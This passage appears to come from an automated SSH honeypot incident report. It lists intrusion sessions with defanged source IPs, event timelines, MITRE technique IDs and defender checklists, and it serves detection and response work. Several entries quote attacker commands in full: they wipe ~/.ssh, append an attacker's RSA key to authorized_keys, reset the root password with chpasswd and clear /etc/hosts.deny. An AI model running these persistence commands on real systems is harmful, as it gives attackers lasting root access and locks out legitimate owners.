| `2026-04-14 02:57:26` | `cowrie.client.version` |
| `2026-04-14 02:57:26` | `cowrie.client.kex` |
| `2026-04-14 02:57:27` | `cowrie.login.success` |
| `2026-04-14 02:57:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.220.238[.]30` to AbuseIPDB if not already reported
- [ ] Block `114.220.238[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2da66a230e07

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-14 02:58 |
| **Last Seen** | 2026-04-14 02:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:58:12` | `cowrie.session.connect` |
| `2026-04-14 02:58:12` | `cowrie.client.version` |
| `2026-04-14 02:58:12` | `cowrie.client.kex` |
| `2026-04-14 02:58:13` | `cowrie.login.success` |
| `2026-04-14 02:58:14` | `cowrie.session.params` |
| `2026-04-14 02:58:14` | `cowrie.command.input` |
| `2026-04-14 02:58:14` | `cowrie.command.failed` |
| `2026-04-14 02:58:14` | `cowrie.log.closed` |
| `2026-04-14 02:58:15` | `cowrie.session.params` |
| `2026-04-14 02:58:15` | `cowrie.command.input` |
| `2026-04-14 02:58:15` | `cowrie.session.file_download` |
| `2026-04-14 02:58:15` | `cowrie.log.closed` |
| `2026-04-14 02:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8464eed791ef

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-14 02:58 |
| **Last Seen** | 2026-04-14 02:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 02:58:19` | `cowrie.session.connect` |
| `2026-04-14 02:58:19` | `cowrie.client.version` |
| `2026-04-14 02:58:19` | `cowrie.client.kex` |
| `2026-04-14 02:58:20` | `cowrie.login.success` |
| `2026-04-14 02:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-318fa03ef7b1

| Field | Detail |
|---|---|
| **Source IP** | `153.99.92[.]11` |
| **First Seen** | 2026-04-14 03:01 |
| **Last Seen** | 2026-04-14 03:02 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:nmNzyflSlV1a"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 03:01:54` | `cowrie.session.connect` |
| `2026-04-14 03:01:54` | `cowrie.client.version` |
| `2026-04-14 03:01:54` | `cowrie.client.kex` |
| `2026-04-14 03:01:55` | `cowrie.login.success` |
| `2026-04-14 03:01:55` | `cowrie.session.params` |
| `2026-04-14 03:01:55` | `cowrie.command.input` |
| `2026-04-14 03:01:55` | `cowrie.command.failed` |
| `2026-04-14 03:01:55` | `cowrie.log.closed` |
| `2026-04-14 03:01:56` | `cowrie.session.params` |
| `2026-04-14 03:01:56` | `cowrie.command.input` |
| `2026-04-14 03:01:56` | `cowrie.session.file_download` |
| `2026-04-14 03:01:56` | `cowrie.log.closed` |
| `2026-04-14 03:02:08` | `cowrie.session.params` |
| `2026-04-14 03:02:08` | `cowrie.command.input` |
| `2026-04-14 03:02:08` | `cowrie.log.closed` |
| `2026-04-14 03:02:08` | `cowrie.session.params` |
| `2026-04-14 03:02:08` | `cowrie.command.input` |
| `2026-04-14 03:02:09` | `cowrie.log.closed` |
| `2026-04-14 03:02:09` | `cowrie.session.params` |
| `2026-04-14 03:02:09` | `cowrie.command.input` |
| `2026-04-14 03:02:09` | `cowrie.session.file_download` |
| `2026-04-14 03:02:09` | `cowrie.log.closed` |
| `2026-04-14 03:02:09` | `cowrie.session.params` |
| `2026-04-14 03:02:09` | `cowrie.command.input` |
| `2026-04-14 03:02:10` | `cowrie.log.closed` |
| `2026-04-14 03:02:10` | `cowrie.session.params` |
| `2026-04-14 03:02:10` | `cowrie.command.input` |
| `2026-04-14 03:02:10` | `cowrie.log.closed` |
| `2026-04-14 03:02:10` | `cowrie.session.params` |
| `2026-04-14 03:02:10` | `cowrie.command.input` |
| `2026-04-14 03:02:10` | `cowrie.command.input` |
| `2026-04-14 03:02:11` | `cowrie.log.closed` |
| `2026-04-14 03:02:11` | `cowrie.session.params` |
| `2026-04-14 03:02:11` | `cowrie.command.input` |
| `2026-04-14 03:02:11` | `cowrie.log.closed` |
| `2026-04-14 03:02:12` | `cowrie.session.params` |
| `2026-04-14 03:02:12` | `cowrie.command.input` |
| `2026-04-14 03:02:12` | `cowrie.log.closed` |
| `2026-04-14 03:02:12` | `cowrie.session.params` |
| `2026-04-14 03:02:12` | `cowrie.command.input` |
| `2026-04-14 03:02:12` | `cowrie.log.closed` |
| `2026-04-14 03:02:12` | `cowrie.session.params` |
| `2026-04-14 03:02:12` | `cowrie.command.input` |
| `2026-04-14 03:02:13` | `cowrie.log.closed` |
| `2026-04-14 03:02:13` | `cowrie.session.params` |
| `2026-04-14 03:02:13` | `cowrie.command.input` |
| `2026-04-14 03:02:13` | `cowrie.log.closed` |
| `2026-04-14 03:02:13` | `cowrie.session.params` |
| `2026-04-14 03:02:13` | `cowrie.command.input` |
| `2026-04-14 03:02:13` | `cowrie.log.closed` |
| `2026-04-14 03:02:14` | `cowrie.session.params` |
| `2026-04-14 03:02:14` | `cowrie.command.input` |
| `2026-04-14 03:02:14` | `cowrie.log.closed` |
| `2026-04-14 03:02:14` | `cowrie.session.params` |
| `2026-04-14 03:02:14` | `cowrie.command.input` |
| `2026-04-14 03:02:14` | `cowrie.log.closed` |
| `2026-04-14 03:02:15` | `cowrie.session.params` |
| `2026-04-14 03:02:15` | `cowrie.command.input` |
| `2026-04-14 03:02:15` | `cowrie.log.closed` |
| `2026-04-14 03:02:15` | `cowrie.session.params` |
| `2026-04-14 03:02:15` | `cowrie.command.input` |
| `2026-04-14 03:02:15` | `cowrie.log.closed` |
| `2026-04-14 03:02:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.99.92[.]11` to AbuseIPDB if not already reported
- [ ] Block `153.99.92[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20e1743a3463

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-14 03:04 |
| **Last Seen** | 2026-04-14 03:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 03:04:17` | `cowrie.session.connect` |
| `2026-04-14 03:04:17` | `cowrie.client.version` |
| `2026-04-14 03:04:17` | `cowrie.client.kex` |
| `2026-04-14 03:04:18` | `cowrie.login.success` |
| `2026-04-14 03:04:19` | `cowrie.session.params` |
| `2026-04-14 03:04:19` | `cowrie.command.input` |
| `2026-04-14 03:04:19` | `cowrie.command.failed` |
| `2026-04-14 03:04:19` | `cowrie.log.closed` |
| `2026-04-14 03:04:20` | `cowrie.session.params` |
| `2026-04-14 03:04:20` | `cowrie.command.input` |
| `2026-04-14 03:04:20` | `cowrie.session.file_download` |
| `2026-04-14 03:04:20` | `cowrie.log.closed` |
| `2026-04-14 03:04:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6268a0521231

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-14 03:04 |
| **Last Seen** | 2026-04-14 03:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 03:04:24` | `cowrie.session.connect` |
| `2026-04-14 03:04:24` | `cowrie.client.version` |
| `2026-04-14 03:04:24` | `cowrie.client.kex` |
| `2026-04-14 03:04:25` | `cowrie.login.success` |
| `2026-04-14 03:04:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc1d967b6e7a

| Field | Detail |
|---|---|
| **Source IP** | `121.227.152[.]250` |
| **First Seen** | 2026-04-14 03:04 |
| **Last Seen** | 2026-04-14 03:05 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:nrRdPKYHJRyR"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 03:04:41` | `cowrie.session.connect` |
| `2026-04-14 03:04:41` | `cowrie.client.version` |
| `2026-04-14 03:04:41` | `cowrie.client.kex` |
| `2026-04-14 03:04:43` | `cowrie.login.success` |
| `2026-04-14 03:04:43` | `cowrie.session.params` |
| `2026-04-14 03:04:43` | `cowrie.command.input` |
| `2026-04-14 03:04:43` | `cowrie.command.failed` |
| `2026-04-14 03:04:43` | `cowrie.log.closed` |
| `2026-04-14 03:04:44` | `cowrie.session.params` |
| `2026-04-14 03:04:44` | `cowrie.command.input` |
| `2026-04-14 03:04:44` | `cowrie.session.file_download` |
| `2026-04-14 03:04:44` | `cowrie.log.closed` |
| `2026-04-14 03:04:55` | `cowrie.session.params` |
| `2026-04-14 03:04:55` | `cowrie.command.input` |
| `2026-04-14 03:04:56` | `cowrie.log.closed` |
| `2026-04-14 03:04:56` | `cowrie.session.params` |
| `2026-04-14 03:04:56` | `cowrie.command.input` |
| `2026-04-14 03:04:57` | `cowrie.log.closed` |
| `2026-04-14 03:04:57` | `cowrie.session.params` |
| `2026-04-14 03:04:57` | `cowrie.command.input` |
| `2026-04-14 03:04:57` | `cowrie.session.file_download` |
| `2026-04-14 03:04:57` | `cowrie.log.closed` |
| `2026-04-14 03:04:58` | `cowrie.session.params` |
| `2026-04-14 03:04:58` | `cowrie.command.input` |
| `2026-04-14 03:04:58` | `cowrie.log.closed` |
| `2026-04-14 03:04:59` | `cowrie.session.params` |
| `2026-04-14 03:04:59` | `cowrie.command.input` |
| `2026-04-14 03:04:59` | `cowrie.log.closed` |
| `2026-04-14 03:05:00` | `cowrie.session.params` |
| `2026-04-14 03:05:00` | `cowrie.command.input` |
| `2026-04-14 03:05:00` | `cowrie.command.input` |
| `2026-04-14 03:05:00` | `cowrie.log.closed` |
| `2026-04-14 03:05:01` | `cowrie.session.params` |
| `2026-04-14 03:05:01` | `cowrie.command.input` |
| `2026-04-14 03:05:01` | `cowrie.log.closed` |
| `2026-04-14 03:05:02` | `cowrie.session.params` |
| `2026-04-14 03:05:02` | `cowrie.command.input` |
| `2026-04-14 03:05:02` | `cowrie.log.closed` |
| `2026-04-14 03:05:03` | `cowrie.session.params` |
| `2026-04-14 03:05:03` | `cowrie.command.input` |
| `2026-04-14 03:05:03` | `cowrie.log.closed` |
| `2026-04-14 03:05:03` | `cowrie.session.params` |
| `2026-04-14 03:05:03` | `cowrie.command.input` |
| `2026-04-14 03:05:03` | `cowrie.log.closed` |
| `2026-04-14 03:05:04` | `cowrie.session.params` |
| `2026-04-14 03:05:04` | `cowrie.command.input` |
| `2026-04-14 03:05:04` | `cowrie.log.closed` |
| `2026-04-14 03:05:04` | `cowrie.session.params` |
| `2026-04-14 03:05:04` | `cowrie.command.input` |
| `2026-04-14 03:05:04` | `cowrie.log.closed` |
| `2026-04-14 03:05:05` | `cowrie.session.params` |
| `2026-04-14 03:05:05` | `cowrie.command.input` |
| `2026-04-14 03:05:05` | `cowrie.log.closed` |
| `2026-04-14 03:05:05` | `cowrie.session.params` |
| `2026-04-14 03:05:05` | `cowrie.command.input` |
| `2026-04-14 03:05:05` | `cowrie.log.closed` |
| `2026-04-14 03:05:06` | `cowrie.session.params` |
| `2026-04-14 03:05:06` | `cowrie.command.input` |
| `2026-04-14 03:05:06` | `cowrie.log.closed` |
| `2026-04-14 03:05:06` | `cowrie.session.params` |
| `2026-04-14 03:05:06` | `cowrie.command.input` |
| `2026-04-14 03:05:06` | `cowrie.log.closed` |
| `2026-04-14 03:05:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.227.152[.]250` to AbuseIPDB if not already reported
- [ ] Block `121.227.152[.]250` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3527c53e452

| Field | Detail |
|---|---|
| **Source IP** | `153.99.92[.]11` |
| **First Seen** | 2026-04-14 03:08 |
| **Last Seen** | 2026-04-14 03:08 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 03:08:29` | `cowrie.session.connect` |
| `2026-04-14 03:08:29` | `cowrie.client.version` |
| `2026-04-14 03:08:29` | `cowrie.client.kex` |
| `2026-04-14 03:08:30` | `cowrie.login.success` |
| `2026-04-14 03:08:30` | `cowrie.session.params` |
| `2026-04-14 03:08:30` | `cowrie.command.input` |
| `2026-04-14 03:08:30` | `cowrie.command.failed` |
| `2026-04-14 03:08:30` | `cowrie.log.closed` |
| `2026-04-14 03:08:31` | `cowrie.session.params` |
| `2026-04-14 03:08:31` | `cowrie.command.input` |
| `2026-04-14 03:08:31` | `cowrie.session.file_download` |
| `2026-04-14 03:08:31` | `cowrie.log.closed` |
| `2026-04-14 03:08:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.99.92[.]11` to AbuseIPDB if not already reported
- [ ] Block `153.99.92[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dba7f8958830

| Field | Detail |
|---|---|
| **Source IP** | `153.99.92[.]11` |
| **First Seen** | 2026-04-14 03:08 |
| **Last Seen** | 2026-04-14 03:13 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 03:08:37` | `cowrie.session.connect` |
| `2026-04-14 03:08:37` | `cowrie.client.version` |
| `2026-04-14 03:08:37` | `cowrie.client.kex` |
| `2026-04-14 03:08:40` | `cowrie.login.success` |
| `2026-04-14 03:13:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.99.92[.]11` to AbuseIPDB if not already reported
- [ ] Block `153.99.92[.]11` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-566734cd252b

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-14 03:11 |
| **Last Seen** | 2026-04-14 03:11 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 03:11:40` | `cowrie.session.connect` |
| `2026-04-14 03:11:40` | `cowrie.client.version` |
| `2026-04-14 03:11:41` | `cowrie.client.kex` |
| `2026-04-14 03:11:42` | `cowrie.login.success` |
| `2026-04-14 03:11:43` | `cowrie.session.params` |
| `2026-04-14 03:11:43` | `cowrie.command.input` |
| `2026-04-14 03:11:43` | `cowrie.command.failed` |
| `2026-04-14 03:11:43` | `cowrie.log.closed` |
| `2026-04-14 03:11:44` | `cowrie.session.params` |
| `2026-04-14 03:11:44` | `cowrie.command.input` |
| `2026-04-14 03:11:44` | `cowrie.session.file_download` |
| `2026-04-14 03:11:44` | `cowrie.log.closed` |
| `2026-04-14 03:11:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec44fcf13533

| Field | Detail |
|---|---|
| **Source IP** | `170.79.37[.]82` |
| **First Seen** | 2026-04-14 03:11 |
| **Last Seen** | 2026-04-14 03:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 03:11:48` | `cowrie.session.connect` |
| `2026-04-14 03:11:48` | `cowrie.client.version` |
| `2026-04-14 03:11:48` | `cowrie.client.kex` |
| `2026-04-14 03:11:50` | `cowrie.login.success` |
| `2026-04-14 03:11:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.79.37[.]82` to AbuseIPDB if not already reported
- [ ] Block `170.79.37[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1371e42e071

| Field | Detail |
|---|---|
| **Source IP** | `121.227.152[.]250` |
| **First Seen** | 2026-04-14 03:12 |
| **Last Seen** | 2026-04-14 03:12 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:SC5HCDJpWa4q"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 03:12:04` | `cowrie.session.connect` |
| `2026-04-14 03:12:04` | `cowrie.client.version` |
| `2026-04-14 03:12:04` | `cowrie.client.kex` |
| `2026-04-14 03:12:05` | `cowrie.login.success` |
| `2026-04-14 03:12:05` | `cowrie.session.params` |
| `2026-04-14 03:12:05` | `cowrie.command.input` |
| `2026-04-14 03:12:05` | `cowrie.command.failed` |
| `2026-04-14 03:12:05` | `cowrie.log.closed` |
| `2026-04-14 03:12:06` | `cowrie.session.params` |
| `2026-04-14 03:12:06` | `cowrie.command.input` |
| `2026-04-14 03:12:06` | `cowrie.session.file_download` |
| `2026-04-14 03:12:06` | `cowrie.log.closed` |
| `2026-04-14 03:12:17` | `cowrie.session.params` |
| `2026-04-14 03:12:17` | `cowrie.command.input` |
| `2026-04-14 03:12:17` | `cowrie.log.closed` |
| `2026-04-14 03:12:17` | `cowrie.session.params` |
| `2026-04-14 03:12:17` | `cowrie.command.input` |
| `2026-04-14 03:12:18` | `cowrie.log.closed` |
| `2026-04-14 03:12:18` | `cowrie.session.params` |
| `2026-04-14 03:12:18` | `cowrie.command.input` |
| `2026-04-14 03:12:18` | `cowrie.session.file_download` |
| `2026-04-14 03:12:18` | `cowrie.log.closed` |
| `2026-04-14 03:12:18` | `cowrie.session.params` |
| `2026-04-14 03:12:18` | `cowrie.command.input` |
